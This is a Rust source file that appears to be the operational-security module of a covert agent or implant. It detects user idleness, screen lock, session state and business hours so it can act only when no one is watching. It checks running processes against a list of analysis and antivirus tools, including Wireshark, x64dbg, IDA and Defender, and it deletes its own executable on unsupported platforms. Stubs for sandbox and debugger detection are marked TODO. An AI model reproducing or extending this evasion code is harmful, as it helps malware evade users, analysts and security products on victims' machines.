use log::{warn, debug};
use std::sync::Mutex;
use chrono::Timelike;
use std::process;
use once_cell::sync::Lazy;
use sysinfo::System;

// Opsec mode per default on High risk to ensure maximum security.
// This module is responsible for detecting the current opsec level based on user activity and system state.
// In short, this ensure the agent to be highly paranoid.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct OpsecState {
    pub mode: AgentMode,
    pub last_transition: std::time::Instant,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpsecLevel {
    High, // High risk, user present/active or unknown
    Low,  // Low risk, user idle/locked and checks passed
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AgentMode {
    FullOpsec,      // User active, agent is quiet
    BackgroundOpsec // User idle/locked, agent can be more active
}

pub static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecState {
    mode: AgentMode::FullOpsec,
    last_transition: std::time::Instant::now(),
}));

pub fn detect_opsec_level() -> OpsecLevel {
    debug!("[OPSEC] detect_opsec_level() called");
    #[cfg(target_os = "windows")]
    {
        let idle = is_user_idle_windows();
        debug!("[OPSEC] is_user_idle_windows() returned: {}", idle);
        if idle {
            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    #[cfg(target_os = "linux")]
    {
        let idle = is_user_idle_linux();
        debug!("[OPSEC] is_user_idle_linux() returned: {}", idle);
        if idle {
            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
            OpsecLevel::Low
        } else {
            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
            OpsecLevel::High
        }
    }
    
    // 
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
        self_delete_and_exit();
    }
}

pub fn determine_agent_mode() -> AgentMode {
    let mut context = OpsecContext::default();
    context.during_business_hours = is_business_hours();
    context.suspicious_process = has_suspicious_process();
    context.suspicious_window = has_suspicious_window();
    context.suspicious_network = is_suspicious_network();

    let idle_level = detect_opsec_level();
    debug!("[OPSEC] Context: {:?}, idle_level: {:?}", context, idle_level);

    // Scoring: if any context signal is true, stay in FullOpsec
    let score = context.score();
    debug!("[OPSEC] Context score: {}", score);

    if score >= 2 || idle_level == OpsecLevel::High {
        AgentMode::FullOpsec
    } else {
        AgentMode::BackgroundOpsec
    }
}

#[cfg(target_os = "windows")]
fn is_user_idle_windows() -> bool {
    use std::ptr;
    use winapi::um::winuser::{LASTINPUTINFO, GetLastInputInfo, OpenInputDesktop, GetForegroundWindow};
    use winapi::shared::minwindef::{DWORD, FALSE};
    use wts_ffi::*;


    // 1. Check idle time
    unsafe {
        let mut lii = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0,
        };
        if GetLastInputInfo(&mut lii) != 0 {
            let tick_count = winapi::um::sysinfoapi::GetTickCount();
            let idle_time = tick_count - lii.dwTime;
            debug!("[OPSEC] Idle time: {} ms", idle_time);
            // Only consider idle if more than 5 minutes
            if idle_time <= 5 * 60 * 1000 {
                debug!("[OPSEC] User not idle (idle_time <= 5min).");
                return false;
            }
        } else {
            warn!("[OPSEC] GetLastInputInfo failed, assuming High Opsec.");
            return false;
        }
    }

    // 2. Check if desktop is locked
    unsafe {
        let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
        if hdesk.is_null() {
            debug!("[OPSEC] Desktop is locked or inaccessible.");
            return true;
        }
        debug!("[OPSEC] Desktop is unlocked.");
        // Optionally: CloseHandle(hdesk);
    }

    // 3. Check session state
    unsafe {
        let mut state: *mut WTS_CONNECTSTATE_CLASS = ptr::null_mut();
        let mut bytes_returned: DWORD = 0;
        let result = WTSQuerySessionInformationW(
            ptr::null_mut(),
            WTS_CURRENT_SESSION,
            0, // WTSConnectState
            &mut state as *mut _ as *mut _,
            &mut bytes_returned,
        );
        if result != 0 && !state.is_null() {
            debug!("[OPSEC] Session state: {:?}", *state);
            if *state != WTS_CONNECTSTATE_CLASS::WTSActive {
                debug!("[OPSEC] Session is not active.");
                return true;
            }
        } else {
            warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
        }
    }

    // 4. Foreground window (optional, for extra paranoia)
    unsafe {
        let fg_window = GetForegroundWindow();
        if fg_window.is_null() {
            debug!("[OPSEC] No foreground window detected.");
            return true;
        }
        debug!("[OPSEC] Foreground window present.");
    }

    // If all checks indicate idle/locked, return true (Low Opsec)
    debug!("[OPSEC] All checks indicate user is present or active.");
    false
}

#[cfg(not(target_os = "windows"))]
fn is_user_idle_windows() -> bool {
    debug!("[OPSEC] is_user_idle_windows() called on non-Windows platform.");
    false
}

#[cfg(target_os = "linux")]
fn is_user_idle_linux() -> bool {
    use log::{debug, error};
    use std::ffi::c_void;
    use std::ptr;
    use libc::{dlopen, dlsym, RTLD_LAZY, c_char, c_ulong, c_int};

    debug!("[OPSEC] is_user_idle_linux() called");

    unsafe {
        // Open libX11
        let x11 = dlopen(b"libX11.so.6\0".as_ptr() as *const c_char, RTLD_LAZY);
        if x11.is_null() {
            error!("[OPSEC] Failed to open libX11.so.6");
            return false;
        }
        // Open libXss
        let xss = dlopen(b"libXss.so.1\0".as_ptr() as *const c_char, RTLD_LAZY);
        if xss.is_null() {
            error!("[OPSEC] Failed to open libXss.so.1");
            return false;
        }

        // Load XOpenDisplay
        let xopen_display: Option<unsafe extern "C" fn(*const c_char) -> *mut c_void> =
            std::mem::transmute(dlsym(x11, b"XOpenDisplay\0".as_ptr() as *const c_char));
        if xopen_display.is_none() {
            error!("[OPSEC] dlsym for XOpenDisplay failed");
            return false;
        }
        let xopen_display = xopen_display.unwrap();

        // Load XDefaultRootWindow
        let xdefault_root_window: Option<unsafe extern "C" fn(*mut c_void) -> c_ulong> =
            std::mem::transmute(dlsym(x11, b"XDefaultRootWindow\0".as_ptr() as *const c_char));
        if xdefault_root_window.is_none() {
            error!("[OPSEC] dlsym for XDefaultRootWindow failed");
            return false;
        }
        let xdefault_root_window = xdefault_root_window.unwrap();

        // Load XScreenSaverAllocInfo
        let xscreensaver_alloc_info: Option<unsafe extern "C" fn() -> *mut c_void> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverAllocInfo\0".as_ptr() as *const c_char));
        if xscreensaver_alloc_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverAllocInfo failed");
            return false;
        }
        let xscreensaver_alloc_info = xscreensaver_alloc_info.unwrap();

        // Load XScreenSaverQueryInfo
        let xscreensaver_query_info: Option<unsafe extern "C" fn(*mut c_void, c_ulong, *mut c_void) -> c_int> =
            std::mem::transmute(dlsym(xss, b"XScreenSaverQueryInfo\0".as_ptr() as *const c_char));
        if xscreensaver_query_info.is_none() {
            error!("[OPSEC] dlsym for XScreenSaverQueryInfo failed");
            return false;
        }
        let xscreensaver_query_info = xscreensaver_query_info.unwrap();

        // Open display
        let display = xopen_display(ptr::null());
        if display.is_null() {
            error!("[OPSEC] XOpenDisplay failed (no X11 session?)");
            return false;
        }

        // Get root window
        let root = xdefault_root_window(display);

        // Allocate info struct
        let info = xscreensaver_alloc_info();
        if info.is_null() {
            error!("[OPSEC] XScreenSaverAllocInfo failed");
            return false;
        }

        // Query info
        let res = xscreensaver_query_info(display, root, info);
        if res == 0 {
            error!("[OPSEC] XScreenSaverQueryInfo failed");
            return false;
        }

        // The struct layout for XScreenSaverInfo:
        #[repr(C)]
        struct XScreenSaverInfo {
            window: c_ulong,
            state: c_int,
            kind: c_int,
            til_or_since: c_ulong,
            idle: c_ulong,
            event_mask: c_ulong,
        }

        let xs_info = &*(info as *const XScreenSaverInfo);
        debug!("[OPSEC] X11 idle time: {} ms", xs_info.idle);

        // Consider idle if more than 5 minutes (300_000 ms)
        xs_info.idle > 300_000
    }
}

// Self delete and exit
pub fn self_delete_and_exit() -> ! {
    use std::env;
    use std::fs;

    if let Ok(path) = env::current_exe() {
        let _ = fs::remove_file(&path);
    }
    process::exit(0);
}

#[derive(Default, Debug)]
struct OpsecContext {
    during_business_hours: bool,
    suspicious_process: bool,
    suspicious_window: bool,
    suspicious_network: bool,
}

impl OpsecContext {
    fn score(&self) -> u8 {
        let mut score = 0;
        if self.during_business_hours { score += 2; }
        if self.suspicious_process { score += 2; }
        if self.suspicious_window { score += 2; }
        if self.suspicious_network { score += 2; }
        score
    }
}

fn is_business_hours() -> bool {
    let now = chrono::Local::now();
    let hour = now.hour();
    // 8am to 6pm considered business hours
    hour >= 8 && hour < 18
}

fn has_suspicious_process() -> bool {
    let suspicious = ["wireshark", "tcpdump", "procmon", "procexp", "ida", "x64dbg", "ollydbg", "avast", "kaspersky", "defender"];
    let sys = System::new_all();
    for (_pid, process) in sys.processes() {
        let name = process.name().to_string_lossy().to_lowercase();
        if suspicious.iter().any(|s| name.contains(s)) {
            return true;
        }
    }
    false
}

// TODO: Implement Sandbox detection
// pub fn is_sandboxed() -> bool { false }

//TODO: Implement Debugger detection
// pub fn is_debugged() -> bool { false }

// Placeholder: returns false, implement with platform-specific code for real use
fn has_suspicious_window() -> bool { false }

// Placeholder: returns false, implement with platform-specific code for real use
fn is_suspicious_network() -> bool { false }

#[cfg(target_os = "windows")]
#[allow(non_camel_case_types, non_snake_case, non_upper_case_globals)]
mod wts_ffi {
    use std::os::raw::{c_void, c_ulong, c_int};

    pub type HANDLE = *mut c_void;
    pub type DWORD = c_ulong;
    pub type LPWSTR = *mut u16;
    pub type LPTSTR = *mut u16;
    pub type BOOL = c_int;

    pub const WTS_CURRENT_SESSION: DWORD = 0xFFFFFFFF;
    pub const WTS_CONNECTSTATE_CLASS_WTSActive: u32 = 0; // 0 is WTSActive

    #[repr(C)]
    #[derive(Debug, Copy, Clone, PartialEq)] // <-- Add PartialEq here
    pub enum WTS_CONNECTSTATE_CLASS {
        WTSActive,
        WTSConnected,
        WTSConnectQuery,
        WTSShadow,
        WTSDisconnected,
        WTSIdle,
        WTSListen,
        WTSReset,
        WTSDown,
        WTSInit,
    }

    extern "system" {
        pub fn WTSQuerySessionInformationW(
            hServer: HANDLE,
            SessionId: DWORD,
            WTSInfoClass: DWORD,
            ppBuffer: *mut *mut u8,
            pBytesReturned: *mut DWORD,
        ) -> BOOL;
    }
}